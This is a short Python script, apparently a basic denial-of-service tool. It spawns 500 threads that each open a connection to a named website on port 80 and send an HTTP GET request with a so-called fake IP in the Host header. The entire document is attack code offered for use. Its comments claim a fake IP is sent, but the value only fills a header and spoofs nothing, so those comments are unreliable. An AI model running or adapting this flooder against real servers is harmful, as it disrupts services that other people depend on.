import socket
import threading

# Define the target
target = 'websiteserverexample.com.br'

# Define the port
port = 80

# Define Fake IP
fake_ip = '192.21.20.32'

# Define function to send the DoS packet
def attack() -> None:
    # Create a socket
    socket_use = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target
    socket_use.connect((target, port))

    # Send the fake IP
    socket_use.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
    socket_use.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    # socket_use.send(fake_ip.encode())

    # Close the socket
    socket_use.close()

    # global already_connected
    # already_connected += 1
    # if already_connected % 500 == 0:
    #     print(f'[+] Sent {already_connected} packets to {target}')
    # print('[+] Done!')


for i in range(0, 500):
    # Create a thread
    thread = threading.Thread(target=attack)

    # Start the thread
    thread.start()
